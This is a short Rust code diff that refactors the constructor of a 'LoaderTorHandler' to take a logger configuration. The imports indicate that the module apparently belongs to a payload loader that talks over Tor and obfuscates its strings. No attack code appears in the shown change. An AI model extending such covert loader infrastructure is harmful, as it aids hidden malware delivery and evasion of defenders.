@@ -1,15 +1,15 @@
 use std::path::PathBuf;
 use anyhow::{ Context, Result };
 use loader_vars::types::receive::{ self, LoaderReceivePayload };
-use shared::network::tor::TorHandler;
+use shared::network::tor::{ LoggerConfig, TorHandler };
 use obfstr::obfstr as s;
 pub struct LoaderTorHandler {
     tor_handler: TorHandler,
 }
 
 impl LoaderTorHandler {
-    pub async fn new(log_directory: PathBuf, log_encryption_key: String) -> Result<Self> {
-        let tor_handler = TorHandler::new(log_directory, log_encryption_key).await?;
+    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
+        let tor_handler = TorHandler::new(logger_config).await?;
         Ok(LoaderTorHandler { tor_handler })
     }
 
